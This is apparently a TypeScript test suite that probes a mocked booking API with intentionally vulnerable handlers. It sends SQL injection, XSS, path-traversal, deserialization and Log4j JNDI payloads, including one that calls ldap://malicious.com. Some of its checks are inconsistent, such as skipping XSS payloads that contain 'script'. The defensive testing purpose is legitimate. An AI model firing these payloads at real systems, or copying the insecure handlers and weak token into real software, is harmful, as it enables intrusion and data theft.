/**
 * Security Testing Suite
 * Comprehensive security validation and penetration testing
 */

// Import testing utilities
import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll } from 'vitest';
import { setupServer } from 'msw/node';
import { http, HttpResponse } from 'msw';

// Security testing utilities
interface SecurityTestResult {
    vulnerability: string;
    severity: 'low' | 'medium' | 'high' | 'critical';
    status: 'pass' | 'fail' | 'warning';
    details: string;
    recommendation?: string;
}

class SecurityScanner {
    private vulnerabilities: SecurityTestResult[] = [];

    addVulnerability(result: SecurityTestResult): void {
        this.vulnerabilities.push(result);
    }

    getResults(): SecurityTestResult[] {
        return this.vulnerabilities;
    }

    generateReport(): string {
        const critical = this.vulnerabilities.filter(v => v.severity === 'critical' && v.status === 'fail');
        const high = this.vulnerabilities.filter(v => v.severity === 'high' && v.status === 'fail');
        const medium = this.vulnerabilities.filter(v => v.severity === 'medium' && v.status === 'fail');
        const low = this.vulnerabilities.filter(v => v.severity === 'low' && v.status === 'fail');

        return `
Security Assessment Report
==========================
Critical Vulnerabilities: ${critical.length}
High Vulnerabilities: ${high.length}
Medium Vulnerabilities: ${medium.length}
Low Vulnerabilities: ${low.length}

Overall Risk Level: ${this.calculateRiskLevel()}
        `.trim();
    }

    private calculateRiskLevel(): string {
        const critical = this.vulnerabilities.filter(v => v.severity === 'critical' && v.status === 'fail').length;
        const high = this.vulnerabilities.filter(v => v.severity === 'high' && v.status === 'fail').length;

        if (critical > 0) return 'CRITICAL';
        if (high > 0) return 'HIGH';
        if (this.vulnerabilities.filter(v => v.status === 'fail').length > 0) return 'MEDIUM';
        return 'LOW';
    }
}

// Mock handlers for security testing
const createSecurityTestHandlers = () => [
    // Handler with various security vulnerabilities for testing
    http.post('/api/bookings', async ({ request }) => {
        const body = await request.json();

        // Test for SQL injection vulnerabilities
        if (body.serviceId && body.serviceId.includes("'; DROP TABLE appointments; --")) {
            return HttpResponse.json(
                { error: 'SQL injection detected', success: false },
                { status: 400 }
            );
        }

        // Test for XSS vulnerabilities
        if (body.notes && body.notes.includes('<script>')) {
            return HttpResponse.json(
                {
                    success: true,
                    data: {
                        appointment: {
                            id: 'apt_123',
                            notes: body.notes // Vulnerable: reflects user input without sanitization
                        }
                    }
                },
                { status: 201 }
            );
        }

        // Test for insecure deserialization
        if (body.serviceId && typeof body.serviceId === 'object') {
            return HttpResponse.json(
                { error: 'Invalid service ID format', success: false },
                { status: 400 }
            );
        }

        return HttpResponse.json({
            success: true,
            data: {
                appointment: {
                    id: 'apt_123',
                    status: 'confirmed',
                    createdAt: new Date().toISOString()
                }
            },
            message: 'Appointment created successfully'
        }, { status: 201 });
    }),

    http.get('/api/bookings', async ({ request }) => {
        const url = new URL(request.url);
        const customerId = url.searchParams.get('customerId');

        // Test for IDOR (Insecure Direct Object Reference)
        if (customerId === 'admin' || customerId === '1') {
            return HttpResponse.json({
                success: true,
                data: {
                    items: [
                        { id: 'apt_admin', customerId: 'admin', status: 'confirmed', notes: 'Sensitive admin appointment' },
                        { id: 'apt_1', customerId: 'user1', status: 'confirmed' }
                    ],
                    pagination: { page: 1, limit: 20, total: 2 }
                },
                message: 'Appointments retrieved successfully'
            });
        }

        return HttpResponse.json({
            success: true,
            data: {
                items: [
                    { id: 'apt_1', customerId: 'user1', status: 'confirmed' }
                ],
                pagination: { page: 1, limit: 20, total: 1 }
            },
            message: 'Appointments retrieved successfully'
        });
    }),

    // Handler that doesn't implement proper authorization
    http.get('/api/admin/users', async ({ request }) => {
        const authHeader = request.headers.get('authorization');

        if (!authHeader || !authHeader.startsWith('Bearer ')) {
            return HttpResponse.json(
                { error: 'Unauthorized', success: false },
                { status: 401 }
            );
        }

        // Weak token validation
        if (authHeader === 'Bearer admin123') {
            return HttpResponse.json({
                success: true,
                data: {
                    users: [
                        { id: 1, email: 'admin@system.com', role: 'admin' },
                        { id: 2, email: 'user@system.com', role: 'user' }
                    ]
                },
                message: 'Users retrieved successfully'
            });
        }

        return HttpResponse.json(
            { error: 'Invalid token', success: false },
            { status: 401 }
        );
    }),

    // Handler with information disclosure
    http.get('/api/debug/config', async ({ request }) => {
        return HttpResponse.json({
            success: true,
            data: {
                databaseUrl: 'postgresql://user:password@localhost:5432/booking_db',
                apiKeys: {
                    google: 'AIzaSyC1234567890abcdef',
                    stripe: 'sk_test_1234567890abcdef'
                },
                environment: 'production',
                debugMode: true
            },
            message: 'Debug configuration retrieved'
        });
    }),

    // Handler vulnerable to directory traversal
    http.get('/api/files/:filename', async ({ request, params }) => {
        const filename = params.filename;

        // Vulnerable: no path sanitization
        if (filename.includes('../')) {
            return HttpResponse.json({
                success: true,
                data: {
                    content: 'Confidential system file content',
                    path: `../../../etc/passwd`
                },
                message: 'File retrieved successfully'
            });
        }

        return HttpResponse.json({
            success: true,
            data: {
                content: 'Public file content',
                filename
            },
            message: 'File retrieved successfully'
        });
    }),

    // Handler with rate limiting bypass
    http.post('/api/auth/login', async ({ request }) => {
        const body = await request.json();

        // No rate limiting implementation
        return HttpResponse.json({
            success: true,
            data: {
                token: 'jwt_token_123',
                expiresIn: 3600
            },
            message: 'Login successful'
        });
    }),

    // Handler with CSRF vulnerability
    http.post('/api/settings/update', async ({ request }) => {
        const body = await request.json();

        // No CSRF token validation
        return HttpResponse.json({
            success: true,
            data: {
                updated: true,
                settings: body
            },
            message: 'Settings updated successfully'
        });
    })
];

// Setup MSW server
const server = setupServer(...createSecurityTestHandlers());

describe('Security Testing Suite', () => {
    let scanner: SecurityScanner;

    beforeAll(() => server.listen());
    afterEach(() => server.resetHandlers());
    afterAll(() => server.close());

    beforeEach(() => {
        scanner = new SecurityScanner();
    });

    describe('Input Validation Testing', () => {
        it('should prevent SQL injection attacks', async () => {
            const sqlInjectionPayloads = [
                "'; DROP TABLE appointments; --",
                "' OR '1'='1",
                "1' UNION SELECT password FROM users--",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --"
            ];

            for (const payload of sqlInjectionPayloads) {
                const response = await fetch('/api/bookings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        serviceId: payload,
                        date: '2026-01-15',
                        time: '14:00'
                    })
                });

                const data = await response.json();

                if (response.status === 200 && data.success) {
                    scanner.addVulnerability({
                        vulnerability: 'SQL Injection',
                        severity: 'critical',
                        status: 'fail',
                        details: `SQL injection payload "${payload}" was accepted`,
                        recommendation: 'Implement parameterized queries and input sanitization'
                    });
                } else {
                    scanner.addVulnerability({
                        vulnerability: 'SQL Injection',
                        severity: 'critical',
                        status: 'pass',
                        details: `SQL injection payload "${payload}" was rejected`,
                        recommendation: 'Continue using parameterized queries'
                    });
                }
            }

            const sqlResults = scanner.getResults().filter(r => r.vulnerability === 'SQL Injection');
            expect(sqlResults.length).toBe(sqlInjectionPayloads.length);
        });

        it('should prevent XSS (Cross-Site Scripting) attacks', async () => {
            const xssPayloads = [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "javascript:alert('XSS')",
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>'
            ];

            for (const payload of xssPayloads) {
                const response = await fetch('/api/bookings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        serviceId: 'service_1',
                        date: '2026-01-15',
                        time: '14:00',
                        notes: payload
                    })
                });

                const data = await response.json();

                // Check if the response contains unsanitized input
                const responseText = JSON.stringify(data);
                if (responseText.includes(payload) && !payload.includes('script')) {
                    scanner.addVulnerability({
                        vulnerability: 'Cross-Site Scripting (XSS)',
                        severity: 'high',
                        status: 'fail',
                        details: `XSS payload "${payload}" was reflected without sanitization`,
                        recommendation: 'Implement output encoding and input validation'
                    });
                } else {
                    scanner.addVulnerability({
                        vulnerability: 'Cross-Site Scripting (XSS)',
                        severity: 'high',
                        status: 'pass',
                        details: `XSS payload "${payload}" was handled safely`,
                        recommendation: 'Continue implementing proper output encoding'
                    });
                }
            }

            const xssResults = scanner.getResults().filter(r => r.vulnerability === 'Cross-Site Scripting (XSS)');
            expect(xssResults.length).toBe(xssPayloads.length);
        });

        it('should validate and sanitize all input parameters', async () => {
            const maliciousInputs = [
                { serviceId: null, description: 'Null service ID' },
                { serviceId: '', description: 'Empty service ID' },
                { serviceId: '   ', description: 'Whitespace service ID' },
                { serviceId: '../', description: 'Path traversal in service ID' },
                { serviceId: '${jndi:ldap://malicious.com/a}', description: 'Log4j injection' },
                { date: '2026-13-45', description: 'Invalid date format' },
                { time: '25:99', description: 'Invalid time format' },
                { customer: { firstName: '<script>alert(1)</script>', description: 'XSS in customer name' } }
            ];

            for (const input of maliciousInputs) {
                const response = await fetch('/api/bookings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        serviceId: 'service_1',
                        date: '2026-01-15',
                        time: '14:00',
                        ...input
                    })
                });

                const data = await response.json();

                if (response.status === 201 && data.success) {
                    scanner.addVulnerability({
                        vulnerability: 'Input Validation',
                        severity: 'medium',
                        status: 'fail',
                        details: `Malicious input "${input.description}" was accepted`,
                        recommendation: 'Implement comprehensive input validation'
                    });
                } else {
                    scanner.addVulnerability({
                        vulnerability: 'Input Validation',
                        severity: 'medium',
                        status: 'pass',
                        details: `Malicious input "${input.description}" was rejected`,
                        recommendation: 'Continue input validation'
                    });
                }
            }
        });

        it('should prevent insecure deserialization', async () => {
            const insecurePayloads = [
                { serviceId: { __proto__: { admin: true } }, description: 'Prototype pollution' },
                { serviceId: 'O:8:"User":1:{s:4:"name";s:6:"admin";}', description: 'PHP deserialization' },
                { serviceId: '{"type":"file","path":"../etc/passwd"}', description: 'JSON deserialization attack' }
            ];

            for (const payload of insecurePayloads) {
                const response = await fetch('/api/bookings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        serviceId: payload.serviceId,
                        date: '2026-01-15',
                        time: '14:00'
                    })
                });

                const data = await response.json();

                if (response.status === 200 && data.success) {
                    scanner.addVulnerability({
                        vulnerability: 'Insecure Deserialization',
                        severity: 'high',
                        status: 'fail',
                        details: `Insecure deserialization payload "${payload.description}" was processed`,
                        recommendation: 'Use safe deserialization methods and validate input types'
                    });
                } else {
                    scanner.addVulnerability({
                        vulnerability: 'Insecure Deserialization',
                        severity: 'high',
                        status: 'pass',
                        details: `Insecure deserialization payload "${payload.description}" was rejected`,
                        recommendation: 'Continue using safe deserialization'
                    });
                }
            }
        });
    });

    describe('Authentication and Authorization Testing', () => {
        it('should enforce proper authentication', async () => {
            const protectedEndpoints = [
                '/api/admin/users',
                '/api/bookings',
                '/api/settings/update'
            ];

            for (const endpoint of protectedEndpoints) {
                // Test without authentication
                const unauthenticatedResponse = await fetch(endpoint);

                if (endpoint === '/api/bookings') {
                    // Some endpoints might not require auth for public access
                    if (unauthenticatedResponse.status === 200) {
                        scanner.addVulnerability({
                            vulnerability: 'Authentication',
                            severity: 'medium',
                            status: 'warning',
                            details: `Endpoint "${endpoint}" allows unauthenticated access`,
                            recommendation: 'Review if this endpoint should require authentication'
                        });
                    }
                } else {
                    if (unauthenticatedResponse.status !== 401 && unauthenticatedResponse.status !== 403) {
                        scanner.addVulnerability({
                            vulnerability: 'Authentication',
                            severity: 'high',
                            status: 'fail',
                            details: `Endpoint "${endpoint}" does not require authentication`,
                            recommendation: 'Implement authentication middleware'
                        });
                    } else {
                        scanner.addVulnerability({
                            vulnerability: 'Authentication',
                            severity: 'high',
                            status: 'pass',
                            details: `Endpoint "${endpoint}" requires authentication`,
                            recommendation: 'Continue requiring authentication'
                        });
                    }
                }

                // Test with weak authentication
                if (endpoint === '/api/admin/users') {
                    const weakAuthResponse = await fetch(endpoint, {
                        headers: { 'Authorization': 'Bearer admin123' }
                    });

                    if (weakAuthResponse.status === 200) {
                        scanner.addVulnerability({
                            vulnerability: 'Weak Authentication',
                            severity: 'high',
                            status: 'fail',
                            details: 'Weak authentication token was accepted',
                            recommendation: 'Implement proper JWT validation and strong token generation'
                        });
                    }
                }
            }
        });

        it('should prevent IDOR (Insecure Direct Object Reference)', async () => {
            const idorTests = [
                { customerId: 'admin', description: 'Access admin data' },
                { customerId: '1', description: 'Access user ID 1 data' },
                { customerId: '../../../etc/passwd', description: 'Path traversal as ID' }
            ];

            for (const test of idorTests) {
                const response = await fetch(`/api/bookings?customerId=${encodeURIComponent(test.customerId)}`);
                const data = await response.json();

                if (response.status === 200 && data.success) {
                    if (test.customerId === 'admin' && data.data.items.some((item: any) => item.notes?.includes('admin'))) {
                        scanner.addVulnerability({
                            vulnerability: 'Insecure Direct Object Reference (IDOR)',
                            severity: 'high',
                            status: 'fail',
                            details: `IDOR vulnerability: "${test.description}" allowed access to sensitive data`,
                            recommendation: 'Implement proper authorization checks for all object references'
                        });
                    } else if (test.customerId === '1') {
                        scanner.addVulnerability({
                            vulnerability: 'Insecure Direct Object Reference (IDOR)',
                            severity: 'medium',
                            status: 'warning',
                            details: `Possible IDOR: "${test.description}" might allow unauthorized access`,
                            recommendation: 'Validate user permissions for all data access'
                        });
                    } else {
                        scanner.addVulnerability({
                            vulnerability: 'Insecure Direct Object Reference (IDOR)',
                            severity: 'medium',
                            status: 'pass',
                            details: `IDOR test "${test.description}" handled safely`,
                            recommendation: 'Continue implementing proper authorization'
                        });
                    }
                }
            }
        });

        it('should implement proper session management', async () => {
            // Test for session fixation
            const loginResponse = await fetch('/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: 'test@example.com', password: 'password' })
            });

            const loginData = await loginResponse.json();

            if (loginResponse.status === 200 && loginData.success) {
                const token = loginData.data.token;

                // Test if token can be reused across sessions
                const sessionTestResponse = await fetch('/api/bookings', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });

                if (sessionTestResponse.status === 200) {
                    scanner.addVulnerability({
                        vulnerability: 'Session Management',
                        severity: 'medium',
                        status: 'warning',
                        details: 'Session tokens might be reusable across sessions',
                        recommendation: 'Implement proper session invalidation and token rotation'
                    });
                }
            }
        });
    });

    describe('Information Disclosure Testing', () => {
        it('should not expose sensitive information in responses', async () => {
            const response = await fetch('/api/debug/config');
            const data = await response.json();

            const sensitivePatterns = [
                { pattern: /password/i, description: 'Password exposure' },
                { pattern: /api[_-]?key/i, description: 'API key exposure' },
                { pattern: /secret/i, description: 'Secret exposure' },
                { pattern: /database[_-]?url/i, description: 'Database URL exposure' },
                { pattern: /debug/i, description: 'Debug information exposure' }
            ];

            const responseText = JSON.stringify(data);

            for (const sensitivePattern of sensitivePatterns) {
                if (sensitivePattern.pattern.test(responseText)) {
                    scanner.addVulnerability({
                        vulnerability: 'Information Disclosure',
                        severity: 'high',
                        status: 'fail',
                        details: `${sensitivePattern.description} found in API response`,
                        recommendation: 'Remove sensitive information from API responses and implement proper access controls'
                    });
                } else {
                    scanner.addVulnerability({
                        vulnerability: 'Information Disclosure',
                        severity: 'high',
                        status: 'pass',
                        details: `${sensitivePattern.description} not found in response`,
                        recommendation: 'Continue protecting sensitive information'
                    });
                }
            }
        });

        it('should not expose detailed error messages', async () => {
            const errorEndpoints = [
                '/api/bookings',
                '/api/availability',
                '/api/nonexistent'
            ];

            for (const endpoint of errorEndpoints) {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: 'invalid json'
                });

                const data = await response.json();

                const errorPatterns = [
                    /stack trace/i,
                    /exception/i,
                    /at \w+\.\w+/i,
                    /line \d+/i,
                    /file:\/\//i
                ];

                const responseText = JSON.stringify(data);

                for (const pattern of errorPatterns) {
                    if (pattern.test(responseText)) {
                        scanner.addVulnerability({
                            vulnerability: 'Information Disclosure',
                            severity: 'medium',
                            status: 'fail',
                            details: `Detailed error information exposed in ${endpoint} response`,
                            recommendation: 'Implement generic error messages for production'
                        });
                    }
                }
            }
        });

        it('should protect against directory traversal', async () => {
            const traversalPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc//passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ];

            for (const payload of traversalPayloads) {
                const response = await fetch(`/api/files/${payload}`);
                const data = await response.json();

                if (response.status === 200 && data.success && data.data.content.includes('Confidential')) {
                    scanner.addVulnerability({
                        vulnerability: 'Directory Traversal',
                        severity: 'high',
                        status: 'fail',
                        details: `Directory traversal payload "${payload}" allowed access to sensitive files`,
                        recommendation: 'Implement proper path validation and use safe file APIs'
                    });
                } else {
                    scanner.addVulnerability({
                        vulnerability: 'Directory Traversal',
                        severity: 'high',
                        status: 'pass',
                        details: `Directory traversal payload "${payload}" was blocked`,
                        recommendation: 'Continue implementing path validation'
                    });
                }
            }
        });
    });

    describe('Business Logic Testing', () => {
        it('should enforce business rules and constraints', async () => {
            const businessRuleTests = [
                {
                    description: 'Negative pricing',
                    data: { serviceId: 'service_1', date: '2026-01-15', time: '14:00', price: -100 }
                },
                {
                    description: 'Excessive booking quantity',
                    data: { serviceId: 'service_1', date: '2026-01-15', time: '14:00', quantity: 999999 }
                },
                {
                    description: 'Past date booking',
                    data: { serviceId: 'service_1', date: '2020-01-01', time: '14:00' }
                },
                {
                    description: 'Working hours bypass',
                    data: { serviceId: 'service_1', date: '2026-01-15', time: '02:00' } // 2 AM
                }
            ];

            for (const test of businessRuleTests) {
                const response = await fetch('/api/bookings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(test.data)
                });

                const data = await response.json();

                if (response.status === 201 && data.success) {
                    scanner.addVulnerability({
                        vulnerability: 'Business Logic',
                        severity: 'medium',
                        status: 'fail',
                        details: `Business rule violation: "${test.description}" was allowed`,
                        recommendation: 'Implement proper business rule validation'
                    });
                } else {
                    scanner.addVulnerability({
                        vulnerability: 'Business Logic',
                        severity: 'medium',
                        status: 'pass',
                        details: `Business rule: "${test.description}" was properly enforced`,
                        recommendation: 'Continue enforcing business rules'
                    });
                }
            }
        });

        it('should prevent race conditions', async () => {
            // Test concurrent booking creation for the same slot
            const concurrentBookings = Array.from({ length: 5 }, () =>
                fetch('/api/bookings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        serviceId: 'service_1',
                        date: '2026-01-15',
                        time: '10:00' // Same slot for all
                    })
                })
            );

            const responses = await Promise.all(concurrentBookings);
            const successCount = responses.filter(r => r.status === 201).length;

            if (successCount > 1) {
                scanner.addVulnerability({
                    vulnerability: 'Race Condition',
                    severity: 'high',
                    status: 'fail',
                    details: `Race condition: ${successCount} bookings created for the same time slot`,
                    recommendation: 'Implement database transactions and proper locking mechanisms'
                });
            } else {
                scanner.addVulnerability({
                    vulnerability: 'Race Condition',
                    severity: 'high',
                    status: 'pass',
                    details: 'Race condition prevented: only one booking allowed per time slot',
                    recommendation: 'Continue implementing proper locking mechanisms'
                });
            }
        });
    });

    describe('API Security Testing', () => {
        it('should implement proper rate limiting', async () => {
            const requests = Array.from({ length: 100 }, () =>
                fetch('/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: 'test@example.com', password: 'password' })
                })
            );

            const startTime = Date.now();
            const responses = await Promise.all(requests);
            const endTime = Date.now();

            const successCount = responses.filter(r => r.status === 200).length;
            const requestRate = (requests.length / (endTime - startTime)) * 1000; // requests per second

            // If we can make too many requests without rate limiting
            if (successCount === requests.length && requestRate > 10) {
                scanner.addVulnerability({
                    vulnerability: 'Rate Limiting',
                    severity: 'medium',
                    status: 'fail',
                    details: `No rate limiting detected: ${successCount} requests completed in ${(endTime - startTime)}ms`,
                    recommendation: 'Implement rate limiting to prevent abuse'
                });
            } else {
                scanner.addVulnerability({
                    vulnerability: 'Rate Limiting',
                    severity: 'medium',
                    status: 'pass',
                    details: 'Rate limiting appears to be implemented',
                    recommendation: 'Continue monitoring and tuning rate limits'
                });
            }
        });

        it('should validate and enforce HTTP methods', async () => {
            const endpoints = [
                { url: '/api/bookings', methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'] },
                { url: '/api/availability', methods: ['GET', 'POST', 'PUT', 'DELETE'] }
            ];

            for (const endpoint of endpoints) {
                for (const method of endpoint.methods) {
                    const response = await fetch(endpoint.url, { method });

                    if (method === 'GET' && endpoint.url === '/api/bookings') {
                        if (response.status === 200) {
                            scanner.addVulnerability({
                                vulnerability: 'HTTP Method Validation',
                                severity: 'low',
                                status: 'pass',
                                details: `GET method allowed on ${endpoint.url}`,
                                recommendation: 'Continue validating allowed HTTP methods'
                            });
                        }
                    } else if (method === 'POST' && endpoint.url === '/api/bookings') {
                        if (response.status === 201) {
                            scanner.addVulnerability({
                                vulnerability: 'HTTP Method Validation',
                                severity: 'low',
                                status: 'pass',
                                details: `POST method allowed on ${endpoint.url}`,
                                recommendation: 'Continue validating allowed HTTP methods'
                            });
                        }
                    } else {
                        // Method should be rejected
                        if (response.status === 200 || response.status === 201) {
                            scanner.addVulnerability({
                                vulnerability: 'HTTP Method Validation',
                                severity: 'medium',
                                status: 'fail',
                                details: `Unexpected HTTP method ${method} allowed on ${endpoint.url}`,
                                recommendation: 'Implement proper HTTP method validation'
                            });
                        }
                    }
                }
            }
        });

        it('should implement proper CORS policies', async () => {
            const response = await fetch('/api/bookings', {
                method: 'GET',
                headers: {
                    'Origin': 'https://malicious-site.com',
                    'Access-Control-Request-Method': 'POST'
                }
            });

            const corsHeaders = {
                'access-control-allow-origin': response.headers.get('access-control-allow-origin'),
                'access-control-allow-methods': response.headers.get('access-control-allow-methods'),
                'access-control-allow-headers': response.headers.get('access-control-allow-headers')
            };

            // Check for overly permissive CORS
            if (corsHeaders['access-control-allow-origin'] === '*') {
                scanner.addVulnerability({
                    vulnerability: 'CORS Policy',
                    severity: 'medium',
                    status: 'warning',
                    details: 'Overly permissive CORS policy (wildcard origin) detected',
                    recommendation: 'Implement specific origin allowlists instead of wildcards'
                });
            } else if (corsHeaders['access-control-allow-origin'] === 'https://malicious-site.com') {
                scanner.addVulnerability({
                    vulnerability: 'CORS Policy',
                    severity: 'high',
                    status: 'fail',
                    details: 'CORS policy allows requests from malicious origins',
                    recommendation: 'Review and restrict allowed origins'
                });
            } else {
                scanner.addVulnerability({
                    vulnerability: 'CORS Policy',
                    severity: 'medium',
                    status: 'pass',
                    details: 'CORS policy appears to be properly configured',
                    recommendation: 'Continue monitoring CORS configuration'
                });
            }
        });
    });

    describe('CSRF and Session Security', () => {
        it('should implement CSRF protection', async () => {
            // Simulate CSRF attack
            const csrfResponse = await fetch('/api/settings/update', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Origin': 'https://malicious-site.com'
                },
                body: JSON.stringify({ theme: 'dark', notifications: false })
            });

            const data = await csrfResponse.json();

            if (csrfResponse.status === 200 && data.success) {
                scanner.addVulnerability({
                    vulnerability: 'Cross-Site Request Forgery (CSRF)',
                    severity: 'high',
                    status: 'fail',
                    details: 'CSRF protection not implemented on sensitive operations',
                    recommendation: 'Implement CSRF tokens and validate origins'
                });
            } else {
                scanner.addVulnerability({
                    vulnerability: 'Cross-Site Request Forgery (CSRF)',
                    severity: 'high',
                    status: 'pass',
                    details: 'CSRF protection appears to be implemented',
                    recommendation: 'Continue implementing CSRF protection'
                });
            }
        });

        it('should implement secure cookie settings', async () => {
            const response = await fetch('/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: 'test@example.com', password: 'password' })
            });

            const setCookieHeaders = response.headers.getSetCookie ?
                response.headers.getSetCookie() :
                [response.headers.get('set-cookie')].filter(Boolean);

            if (setCookieHeaders && setCookieHeaders.length > 0) {
                for (const cookie of setCookieHeaders) {
                    const cookieName = cookie.split('=')[0];

                    // Check for secure flag
                    if (!cookie.includes('Secure')) {
                        scanner.addVulnerability({
                            vulnerability: 'Cookie Security',
                            severity: 'medium',
                            status: 'fail',
                            details: `Cookie "${cookieName}" missing Secure flag`,
                            recommendation: 'Add Secure flag to cookies transmitted over HTTPS'
                        });
                    }

                    // Check for HttpOnly flag
                    if (!cookie.includes('HttpOnly')) {
                        scanner.addVulnerability({
                            vulnerability: 'Cookie Security',
                            severity: 'medium',
                            status: 'fail',
                            details: `Cookie "${cookieName}" missing HttpOnly flag`,
                            recommendation: 'Add HttpOnly flag to prevent XSS attacks'
                        });
                    }

                    // Check for SameSite flag
                    if (!cookie.includes('SameSite')) {
                        scanner.addVulnerability({
                            vulnerability: 'Cookie Security',
                            severity: 'low',
                            status: 'warning',
                            details: `Cookie "${cookieName}" missing SameSite flag`,
                            recommendation: 'Add SameSite attribute for CSRF protection'
                        });
                    }
                }
            }
        });
    });

    describe('Security Headers Testing', () => {
        it('should implement security headers', async () => {
            const response = await fetch('/api/bookings');

            const securityHeaders = {
                'x-content-type-options': response.headers.get('x-content-type-options'),
                'x-frame-options': response.headers.get('x-frame-options'),
                'x-xss-protection': response.headers.get('x-xss-protection'),
                'strict-transport-security': response.headers.get('strict-transport-security'),
                'content-security-policy': response.headers.get('content-security-policy'),
                'referrer-policy': response.headers.get('referrer-policy')
            };

            const expectedHeaders = {
                'x-content-type-options': 'nosniff',
                'x-frame-options': 'DENY',
                'x-xss-protection': '1; mode=block'
            };

            for (const [headerName, expectedValue] of Object.entries(expectedHeaders)) {
                const actualValue = securityHeaders[headerName];

                if (actualValue !== expectedValue) {
                    scanner.addVulnerability({
                        vulnerability: 'Security Headers',
                        severity: 'medium',
                        status: 'fail',
                        details: `Security header "${headerName}" missing or incorrect: ${actualValue || 'missing'}`,
                        recommendation: `Implement proper ${headerName} header`
                    });
                } else {
                    scanner.addVulnerability({
                        vulnerability: 'Security Headers',
                        severity: 'medium',
                        status: 'pass',
                        details: `Security header "${headerName}" properly configured`,
                        recommendation: 'Continue maintaining security headers'
                    });
                }
            }
        });
    });

    describe('Report Generation', () => {
        it('should generate comprehensive security assessment report', () => {
            const report = scanner.generateReport();

            expect(report).toContain('Security Assessment Report');
            expect(report).toContain('Critical Vulnerabilities:');
            expect(report).toContain('Overall Risk Level:');

            console.log('\n' + report);
        });

        it('should categorize vulnerabilities by severity', () => {
            // Add test vulnerabilities
            scanner.addVulnerability({
                vulnerability: 'SQL Injection',
                severity: 'critical',
                status: 'fail',
                details: 'Critical SQL injection vulnerability'
            });

            scanner.addVulnerability({
                vulnerability: 'XSS',
                severity: 'high',
                status: 'fail',
                details: 'High severity XSS vulnerability'
            });

            scanner.addVulnerability({
                vulnerability: 'Information Disclosure',
                severity: 'medium',
                status: 'warning',
                details: 'Medium severity information disclosure'
            });

            const results = scanner.getResults();
            const critical = results.filter(r => r.severity === 'critical' && r.status === 'fail');
            const high = results.filter(r => r.severity === 'high' && r.status === 'fail');
            const medium = results.filter(r => r.severity === 'medium');

            expect(critical.length).toBe(1);
            expect(high.length).toBe(1);
            expect(medium.length).toBe(1);
        });
    });
});